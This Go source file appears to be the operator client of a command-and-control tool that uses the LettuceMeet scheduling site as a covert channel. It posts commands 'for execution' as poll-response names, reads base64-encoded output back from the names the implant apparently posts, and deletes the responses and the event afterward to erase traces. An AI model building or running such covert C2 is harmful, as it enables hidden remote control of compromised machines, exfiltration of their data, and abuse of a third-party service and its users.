package main

import (
	"encoding/json"
	"encoding/base64"
	"fmt"
	"flag"
	"log"
	"strings"
	"LettuceMeet/internal/parser"
	"LettuceMeet/internal/lettucer"
)

func main() {
	id := flag.String("id", "", "specify path segment (id) to LettuceMeet schedule")
	send := flag.String("send", "", "sepcify a command to send [enclosed in quotes ideally] (-id is required)")
	response := flag.Bool("resp", false, "receive and decode the response back (-id is required)")
	help := flag.Bool("h", false, "show help message")
	flag.Parse()

	if *help {
		flag.Usage()
		return
	}

	if *send != "" {
		fmt.Printf("[*] Sending command for execution at https://lettucemeet.com/l/%s\n", *id)
		_, err := lettuceGreet(*id, *send); if err != nil {
			log.Printf("[-] Error Occurred in Lettuce Greet: %v\n", err)
		}
	}

	if *response {
		lettuceOutput(*id)
	}
}

func lettuceOutput(id string) {
	var lettuce parser.Lettuce
	jsonData := []byte(fmt.Sprintf(`{
		"id": "EventQuery",
		"query": "query EventQuery(\n  $id: ID!\n) {\n  event(id: $id) {\n    ...Event_event\n    ...EditEvent_event\n    id\n  }\n}\n\nfragment EditEvent_event on Event {\n  id\n  title\n  description\n  type\n  pollStartTime\n  pollEndTime\n  maxScheduledDurationMins\n  pollDates\n  isScheduled\n  start\n  end\n  timeZone\n  updatedAt\n}\n\nfragment Event_event on Event {\n  id\n  title\n  description\n  type\n  pollStartTime\n  pollEndTime\n  maxScheduledDurationMins\n  timeZone\n  pollDates\n  start\n  end\n  isScheduled\n  createdAt\n  updatedAt\n  user {\n    id\n  }\n  googleEvents {\n    title\n    start\n    end\n  }\n  pollResponses {\n    id\n    user {\n      __typename\n      ... on AnonymousUser {\n        name\n        email\n      }\n      ... on User {\n        id\n        name\n        email\n      }\n      ... on Node {\n        __isNode: __typename\n        id\n      }\n    }\n    availabilities {\n      start\n      end\n    }\n    event {\n      id\n    }\n  }\n}",
		"variables": {
			"id": "%s"
		}
	}`, id))


	body, err := lettucer.LettuceRequest(jsonData); if err != nil {
		log.Printf("[-] Error Occurred with Lettuce Request: %v\n", err)
	}

	err = json.Unmarshal([]byte(body), &lettuce); if err != nil {
		log.Printf("[-] Error Occurred converting Lettuce Request body to json: %v\n", err)
	}

	if len(lettuce.Data.Event.PollResponses) > 0 {
		var names []string

		for _, user := range lettuce.Data.Event.PollResponses {
			names = append(names, user.User.Name)
			err := lettucer.LettuceDelete(user.ID); if err != nil {
				log.Printf("[-] Error Occured with Lettuce Delete: %v\n", err)
			}
		}

		schedules := reverse(names)
		print(schedules)

		finalSchedule := strings.Join(schedules, "")
		schedule, err := base64.StdEncoding.DecodeString(finalSchedule); if err != nil {
			log.Printf("[-] Error Occured decoding string %v\n -> Schedule -> %s", err, finalSchedule)
		}
		fmt.Printf("[*] Response: %s", schedule)
	}
	lettucer.LettuceDelete(id)
}

// function to upload response back to lettuce meet...
func lettuceGreet(id string, greeting string) (string, error) {
	var lettuceSchedule parser.LettuceSchedule

	jsonData := []byte(fmt.Sprintf(`{
		"id": "CreatePollResponseMutation",
		"query": "mutation CreatePollResponseMutation(\n  $input: CreatePollResponseInput!\n) {\n  createPollResponse(input: $input) {\n    pollResponse {\n      id\n      user {\n        __typename\n        ... on AnonymousUser {\n          name\n          email\n        }\n        ... on User {\n          id\n          name\n          email\n          events {\n            id\n          }\n          eventsRespondedTo {\n            id\n          }\n        }\n        ... on Node {\n          __isNode: __typename\n          id\n        }\n      }\n      availabilities {\n        start\n        end\n      }\n      event {\n        id\n        updatedAt\n        user {\n          id\n          name\n          eventsRespondedTo {\n            id\n          }\n        }\n        pollResponses {\n          id\n          event {\n            id\n          }\n          user {\n            __typename\n            ... on AnonymousUser {\n              name\n              email\n            }\n            ... on User {\n              id\n              name\n              email\n            }\n            ... on Node {\n              __isNode: __typename\n              id\n            }\n          }\n          availabilities {\n            start\n            end\n          }\n        }\n      }\n    }\n  }\n}\n",
		"variables": {
			"input": {
				"eventId": "%s",
				"availabilities": [
					{
						"start": "2024-07-14T09:00:00.000Z",
						"end": "2024-07-14T09:30:00.000Z"
					}
				],
				"name": "%s",
				"email": null
			}
		}
	}`, id, greeting))

	body, err := lettucer.LettuceRequest(jsonData); if err != nil {
		return "", err
	}
	err = json.Unmarshal([]byte(body), &lettuceSchedule); if err != nil {
		return "", err
	}

	return lettuceSchedule.Data.CreatePollResponse.PollResponse.ID, nil // grab ID to delete response later 

}

func reverse(list []string) []string {
    for i, j := 0, len(list)-1; i < j; {
        list[i], list[j] = list[j], list[i]
        i++
        j--
    }
    return list
}
